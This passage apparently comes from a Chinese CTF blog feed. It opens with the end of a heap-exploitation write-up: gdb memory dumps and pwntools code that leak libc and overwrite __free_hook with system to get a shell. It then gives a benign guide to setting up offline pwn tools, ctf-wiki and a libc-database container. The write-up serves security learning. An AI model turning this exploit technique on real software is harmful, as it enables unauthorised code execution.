class="number">0x5653ee7a5320</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5330</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5653ee7a5340</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>这时候我remove(5)的话，会变成什么样呢？他会unlink(p)，然后将chunk5向前合并，不信试试看，这里数据需要精心构造，才能造成任意写的能力<br>remove(5)效果，变成了201，这是合并的效果，然后地址部分指向了libc部分的地址，如果我们能泄露这部分地址，就获得libc<br>还有个重点，我们的unlink过程没显示出来，我们分析下，unlink(p)做了啥<br>假设我们chunk4数据部分的地址为myptr<br>这里unlink(p)</p><ol><li>FD = ptr-0x18</li><li>BK = ptr-0x10</li><li>检测FD-&gt;bk==p? &amp;&amp; BK-&gt;fd == p?</li><li>检测成功过后</li><li>FD-&gt;bk &lt;=&gt; FD+0x18 &lt;=&gt; <em>(ptr-0x18+0x18) = BK = ptr-0x10 实际就是</em>ptr=ptr-0x10</li><li>BK-&gt;FD &lt;=&gt; BK+0x10 &lt;=&gt; <em>(ptr-0x10+0x10) = FD = ptr-0x18 实际就是</em>ptr=ptr-0x18<br>重点在第6行，我们将*ptr改成了ptr-0x18</li></ol><p>看ptr是哪里</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">10</span>gx <span class="number">0x5577f976f080</span><span class="number">-0x80</span>+<span class="number">0x180</span></span><br><span class="line"><span class="number">0x5577f976f180</span>:	<span class="number">0x00005577f976f168</span>	<span class="number">0x0000000000000108</span></span><br><span class="line"><span class="number">0x5577f976f190</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f1a0</span>:	<span class="number">0x0000003333333333</span>	<span class="number">0x00005577f976f140</span></span><br><span class="line"><span class="number">0x5577f976f1b0</span>:	<span class="number">0x00005577f976f170</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5577f976f1c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span></span><br></pre></td></tr></table></figure><p>从整体来看</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x5577f976f080</span></span><br><span class="line"><span class="number">0x5577f976f080</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x00005577f976f020</span></span><br><span class="line"><span class="number">0x5577f976f090</span>:	<span class="number">0x00005577f976f050</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5577f976f0a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f0b0</span>:	<span class="number">0x0000000000000006</span>	<span class="number">0x00005577f976f0e0</span></span><br><span class="line"><span class="number">0x5577f976f0c0</span>:	<span class="number">0x00005577f976f3e0</span>	<span class="number">0x0000000000000200</span></span><br><span class="line"><span class="number">0x5577f976f0d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f0e0</span>:	<span class="number">0x0068732f6e69622f</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f0f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f110</span>:	<span class="number">0x00005577f976f130</span>	<span class="number">0x00005577f976f140</span></span><br><span class="line"><span class="number">0x5577f976f120</span>:	<span class="number">0x00005577f976f2e0</span>	<span class="number">0x00000000000000f0</span></span><br><span class="line"><span class="number">0x5577f976f130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f170</span>:	<span class="number">0x0000557700000004</span>	<span class="number">0x00005577f976f1a0</span> #book4结构体</span><br><span class="line"><span class="number">0x5577f976f180</span>:	<span class="number">0x00005577f976f168</span>	<span class="number">0x0000000000000108</span> <span class="meta">#ptr，</span></span><br><span class="line"><span class="number">0x5577f976f190</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f1a0</span>:	<span class="number">0x0000003333333333</span>	<span class="number">0x00005577f976f140</span></span><br><span class="line"><span class="number">0x5577f976f1b0</span>:	<span class="number">0x00005577f976f170</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5577f976f1c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span></span><br><span class="line"><span class="number">0x5577f976f1d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000201</span></span><br><span class="line"><span class="number">0x5577f976f1e0</span>:	<span class="number">0x00007f452ad38b78</span>	<span class="number">0x00007f452ad38b78</span></span><br><span class="line"><span class="number">0x5577f976f1f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f200</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>*ptr = ptr -0x18,也就是0x5577f976f180里的内容改为0x5577f976f168</p><p>这样，再次edit(4,payload)的话就可以修改从168开始的size以及name和description指针</p><p>合并效果</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x5577f976f1c0</span></span><br><span class="line"><span class="number">0x5577f976f1c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span></span><br><span class="line"><span class="number">0x5577f976f1d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000201</span></span><br><span class="line"><span class="number">0x5577f976f1e0</span>:	<span class="number">0x00007f452ad38b78</span>	<span class="number">0x00007f452ad38b78</span></span><br><span class="line"><span class="number">0x5577f976f1f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f200</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f210</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f220</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f230</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f240</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f260</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f270</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f280</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f290</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f2a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f2b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f2c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f2d0</span>:	<span class="number">0x0000000000000100</span>	<span class="number">0x0000000000000100</span></span><br><span class="line"><span class="number">0x5577f976f2e0</span>:	<span class="number">0x0000746567726174</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f2f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f300</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f310</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f320</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f330</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f340</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><h5 id="再次修改book4的结构体"><a href="#再次修改book4的结构体" class="headerlink" title="再次修改book4的结构体"></a>再次修改book4的结构体</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(<span class="number">0x30</span>) + p64(<span class="number">4</span>) + p64(first_heap+<span class="number">0x40</span>)*<span class="number">2</span></span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line">edit(<span class="number">4</span>, p64(heap_base + <span class="number">0x1e0</span>))</span><br><span class="line">printf()</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    io.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">content = io.recvline()</span><br><span class="line">io.info(content)</span><br><span class="line">libc_base = u64(content.strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))<span class="number">-0x3c4b7</span></span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">io.success(<span class="string">'system: 0x%x'</span> % system_addr)</span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br></pre></td></tr></table></figure><p>0x30是他原来大小，4为id 4， 然后我将name和description指针都改为first_heap+0x40处，为什么是这里呢？因为，这里是book6的结构体部分的description部分指针，这样就获得了任意地址读写的能力，<br>第二次edit(4, p64(heap_base + 0x1e0))的时候就是将book6的description指针改成指向heap_base + 0x1e0处，为什么是这里，看上面<br>从整体来看</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x5577f976f080</span></span><br><span class="line"><span class="number">0x5577f976f080</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x00005577f976f020</span></span><br><span class="line"><span class="number">0x5577f976f090</span>:	<span class="number">0x00005577f976f050</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5577f976f0a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f0b0</span>:	<span class="number">0x0000000000000006</span>	<span class="number">0x00005577f976f0e0</span></span><br><span class="line"><span class="number">0x5577f976f0c0</span>:	<span class="number">0x00005577f976f3e0</span>	<span class="number">0x0000000000000200</span></span><br><span class="line"><span class="number">0x5577f976f0d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f0e0</span>:	<span class="number">0x0068732f6e69622f</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f0f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f110</span>:	<span class="number">0x00005577f976f130</span>	<span class="number">0x00005577f976f140</span></span><br><span class="line"><span class="number">0x5577f976f120</span>:	<span class="number">0x00005577f976f2e0</span>	<span class="number">0x00000000000000f0</span></span><br><span class="line"><span class="number">0x5577f976f130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f170</span>:	<span class="number">0x0000557700000004</span>	<span class="number">0x00005577f976f1a0</span> </span><br><span class="line"><span class="number">0x5577f976f180</span>:	<span class="number">0x00005577f976f168</span>	<span class="number">0x0000000000000108</span> </span><br><span class="line"><span class="number">0x5577f976f190</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5577f976f1a0</span>:	<span class="number">0x0000003333333333</span>	<span class="number">0x00005577f976f140</span></span><br><span class="line"><span class="number">0x5577f976f1b0</span>:	<span class="number">0x00005577f976f170</span>	<span class="number">0x0000000000000020</span></span><br><span class="line"><span class="number">0x5577f976f1c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span></span><br><span class="line"><span class="number">0x5577f976f1d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000201</span></span><br><span class="line"><span class="number">0x5577f976f1e0</span>:	<span class="number">0x00007f452ad38b78</span>	<span class="number">0x00007f452ad38b78</span> <span class="meta">#libc地址</span></span><br><span class="line"><span class="number">0x5577f976f1f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5577f976f200</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>这样就泄露了libc地址，那个固定偏移，也是利用vmmap查看，然后相减获得的</p><h5 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(free_hook) + p64(<span class="number">0x200</span>)</span><br><span class="line">edit(<span class="number">4</span>, payload)</span><br><span class="line">edit(<span class="number">6</span>, p64(system_addr))</span><br><span class="line">io.success(<span class="string">'first_heap: 0x%x'</span> % first_heap)</span><br><span class="line">remove(<span class="number">6</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br></pre></td></tr></table></figure><ol><li>edit(4,payload)这里将book6的description指针指向free_hook</li><li>然后edit是改成system地址，最后调用一次free就成了<h2 id="课后小知识总结"><a href="#课后小知识总结" class="headerlink" title="课后小知识总结"></a>课后小知识总结</h2></li><li>在gdb中用find查找字符串，可以获得指定位置</li><li>堆块会复用，就是free过后的小堆块，在再次malloc后会用相同的堆块</li><li>在计算的时候可以以一个为基地址，这样好计算</li><li>vmmap获得libc地址后，在相减获得固定偏移，适用于smallbin第一次free的chunk和mmap申请的堆块</li><li>具体情况具体分析，不要照搬照抄原版exp，有些是要改的，大佬们觉得简单可能就没注释了<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2></li><li>题目不难，但自己做确实有点难度，研究了好久</li><li>写这个入门的文章也挺难的，要自己懂点，有人带就好点了，希望有师傅可以带带我</li><li>要开学了，另一道题目下次在研究了，off-by-one另一道题目</li><li>这道题同时学习了unlink跟off-by-one</li><li>我一定会出这个系列的文章的，坚持就是胜利(我对我自己说的，hh)</li></ol><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/1a1c1b4a/">https://noone-hub.github.io/posts/1a1c1b4a/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>论菜鸡pwn手如何在无网环境（ps：类似国赛)下生存</title>
    <url>/posts/9f664865/</url>
    <content><![CDATA[<p>本文首发于先知社区</p><h1 id="论菜鸡pwn手如何在无网环境（ps：类似国赛-下生存"><a href="#论菜鸡pwn手如何在无网环境（ps：类似国赛-下生存" class="headerlink" title="论菜鸡pwn手如何在无网环境（ps：类似国赛)下生存"></a>论菜鸡pwn手如何在无网环境（ps：类似国赛)下生存</h1><p>引言：在打完一次无网环境后，觉得没网环境实在难受，查个libc都没得查。。没准备好，那时碰巧我下了ctf-challenge,在那里碰巧弄到了libc，可能有人喜欢用libc-searcher那个py版本的项目，我不怎么喜欢，用那个导入库查找感觉较慢，还是喜欢手动泄露后到网页查找，于是有了这篇文章</p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><h2 id="pwntools安装"><a href="#pwntools安装" class="headerlink" title="pwntools安装"></a>pwntools安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure><p>出错自己解决啊，那些个错误都查得到</p><h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gem install one_gadget</span><br></pre></td></tr></table></figure><h2 id="gdb配置"><a href="#gdb配置" class="headerlink" title="gdb配置"></a>gdb配置</h2><p>我个人觉得，peda和pwndbg必备，gef也可以用上，随你<br>自己写了个脚本，很渣，自选用不用<br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3FxMTI3MDI4NzI0NS9nZGItcGx1Z2lucw==" title="https://github.com/qq1270287245/gdb-plugins">项目地址<i class="fa fa-external-link"></i></span><br>三个插件一起用会冲突，一部分功能失效，建议注释掉.gdbinit里的gef部分</p><h2 id="welpwn"><a href="#welpwn" class="headerlink" title="welpwn"></a>welpwn</h2><p>这个项目是国防科技大学弄的，挺好用的，最主要是能加载libc</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/matrix1001/welpwn</span><br></pre></td></tr></table></figure><p>到项目目录下然后</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo python setup.py install</span><br></pre></td></tr></table></figure><p>用法你可以看他项目里的介绍</p><h2 id="ctf-wiki本地搭建"><a href="#ctf-wiki本地搭建" class="headerlink" title="ctf-wiki本地搭建"></a>ctf-wiki本地搭建</h2><p>作为一个不是啥都熟的选手，ctf-wiki还是必备的，打比赛的时候查查exp，查查用法什么都好</p><h3 id="首先安装docker"><a href="#首先安装docker" class="headerlink" title="首先安装docker"></a>首先安装docker</h3><p>这个不讲了</p><h3 id="docker-pull镜像"><a href="#docker-pull镜像" class="headerlink" title="docker pull镜像"></a>docker pull镜像</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker search ctf  <span class="comment">#先查找镜像，镜像名知道可以不查找</span></span><br><span class="line">docker pull ctfwiki/ctf-wiki <span class="comment">#pull ctfwiki镜像</span></span><br><span class="line">docker run -d --name=ctf-wiki -p 4100:80 ctfwiki/ctf-wiki <span class="comment">#-d参数为后台运行，--name为名称 -p为端口映射 4100是本地端口，80是docker端口</span></span><br></pre></td></tr></table></figure><h2 id="部署libc-database"><a href="#部署libc-database" class="headerlink" title="部署libc-database"></a>部署libc-database</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull blukat29/libc</span><br><span class="line">docker run -p 4101:80 -d blukat29/libc</span><br></pre></td></tr></table></figure><p>配置文件目录/etc/nginx/conf.d/nginx.conf<br>启动端口在4101,这里有个小问题，就是无法下载，解决方法，替换nginx的配置文件为如下</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">@app</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">location</span> <span class="variable">@app</span> &#123;</span><br><span class="line">        <span class="attribute">include</span> uwsgi_params;</span><br><span class="line">        <span class="attribute">uwsgi_param</span> Host <span class="variable">$host</span>;</span><br><span class="line">        <span class="attribute">uwsgi_param</span> X-Real-IP <span class="variable">$remote_addr</span>;</span><br><span class="line">        <span class="attribute">uwsgi_param</span> X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">        <span class="attribute">uwsgi_pass</span> unix:///tmp/uwsgi.sock;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">location</span> /static &#123;</span><br><span class="line">        <span class="attribute">alias</span> /app/static;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">location</span> /d &#123;</span><br><span class="line">        <span class="attribute">alias</span> /libc-database/db;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">location</span> <span class="regexp">~ \.symbols$</span> &#123;</span><br><span class="line">            <span class="attribute">default_type</span> text/plain;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最主要是</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">location</span> /d &#123;</span><br><span class="line">    <span class="attribute">alias</span> /libc-database/db;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">location</span> <span class="regexp">~ \.symbols$</span> &#123;</span><br><span class="line">        <span class="attribute">default_type</span> text/plain;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后发觉每次重启都会他配置文件都会重置，研究下了他docker里的东西，发觉是entrypoint.sh影响了，所以修改下entrypoint.sh就行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#! /usr/bin/env bash</span></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line"><span class="comment"># Get the maximum upload file size for Nginx, default to 0: unlimited</span></span><br><span class="line">USE_NGINX_MAX_UPLOAD=<span class="variable">$&#123;NGINX_MAX_UPLOAD:-0&#125;</span></span><br><span class="line"><span class="comment"># Generate Nginx config for maximum upload file size</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"client_max_body_size <span class="variable">$USE_NGINX_MAX_UPLOAD</span>;"</span> &gt; /etc/nginx/conf.d/upload.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get the number of workers for Nginx, default to 1</span></span><br><span class="line">USE_NGINX_WORKER_PROCESSES=<span class="variable">$&#123;NGINX_WORKER_PROCESSES:-1&#125;</span></span><br><span class="line"><span class="comment"># Modify the number of worker processes in Nginx config</span></span><br><span class="line">sed -i <span class="string">"/worker_processes\s/c\worker_processes <span class="variable">$&#123;USE_NGINX_WORKER_PROCESSES&#125;</span>;"</span> /etc/nginx/nginx.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get the URL for static files from the environment variable</span></span><br><span class="line">USE_STATIC_URL=<span class="variable">$&#123;STATIC_URL:-'/static'&#125;</span></span><br><span class="line"><span class="comment"># Get the absolute path of the static files from the environment variable</span></span><br><span class="line">USE_STATIC_PATH=<span class="variable">$&#123;STATIC_PATH:-'/app/static'&#125;</span></span><br><span class="line"><span class="comment"># Get the listen port for Nginx, default to 80</span></span><br><span class="line">USE_LISTEN_PORT=<span class="variable">$&#123;LISTEN_PORT:-80&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate Nginx config first part using the environment variables</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"server &#123;</span></span><br><span class="line"><span class="string">    listen 80;</span></span><br><span class="line"><span class="string">    location / &#123;</span></span><br><span class="line"><span class="string">        try_files \$uri @app;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    location @app &#123;</span></span><br><span class="line"><span class="string">        include uwsgi_params;</span></span><br><span class="line"><span class="string">        uwsgi_param Host \$host;</span></span><br><span class="line"><span class="string">        uwsgi_param X-Real-IP \$remote_addr;</span></span><br><span class="line"><span class="string">        uwsgi_param X-Forwarded-For \$proxy_add_x_forwarded_for;</span></span><br><span class="line"><span class="string">        uwsgi_pass unix:///tmp/uwsgi.sock;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    location /static &#123;</span></span><br><span class="line"><span class="string">        alias /app/static;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    location /d &#123;</span></span><br><span class="line"><span class="string">        alias /libc-database/db;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        location ~ \.symbols$ &#123;</span></span><br><span class="line"><span class="string">            default_type text/plain;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;"</span> &gt; /etc/nginx/conf.d/nginx.conf</span><br><span class="line"></span><br><span class="line"><span class="comment"># If STATIC_INDEX is 1, serve / with /static/index.html directly (or the static URL configured)</span></span><br><span class="line"><span class="keyword">if</span> [[ <span class="variable">$STATIC_INDEX</span> == 1 ]] ; <span class="keyword">then</span> </span><br><span class="line"><span class="built_in">echo</span> <span class="string">"    location = / &#123;</span></span><br><span class="line"><span class="string">        index <span class="variable">$USE_STATIC_URL</span>/index.html;</span></span><br><span class="line"><span class="string">    &#125;"</span> &gt;&gt; /etc/nginx/conf.d/nginx.conf</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment"># Finish the Nginx config file</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&#125;"</span> &gt;&gt; /etc/nginx/conf.d/nginx.conf</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span> <span class="string">"<span class="variable">$@</span>"</span></span><br></pre></td></tr></table></figure><p>然后就部署完成了,如果还嫌麻烦，可以用下我这个Dockerfile<br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3FxMTI3MDI4NzI0NS9saWJjc2VhcmNoZXI=" title="https://github.com/qq1270287245/libcsearcher">项目地址<i class="fa fa-external-link"></i></span><br>用法在项目里已经说明了，只是修改了一点点错误</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>libc database search<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"</span> <span class="attr">integrity</span>=<span class="string">"sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u"</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;&#123; url_for('static', filename='style.css') &#125;&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://code.jquery.com/ui/1.12.1/themes/start/jquery-ui.css"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;&#123; url_for('static', filename='bootstrap.min.js') &#125;&#125;"</span> <span class="attr">integrity</span>=<span class="string">"sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa"</span> <span class="attr">crossorigin</span>=<span class="string">"anonymous"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;&#123; url_for('static', filename='jquery-ui.min.js') &#125;&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"&#123;&#123; url_for('static', filename='URI.min.js') &#125;&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span 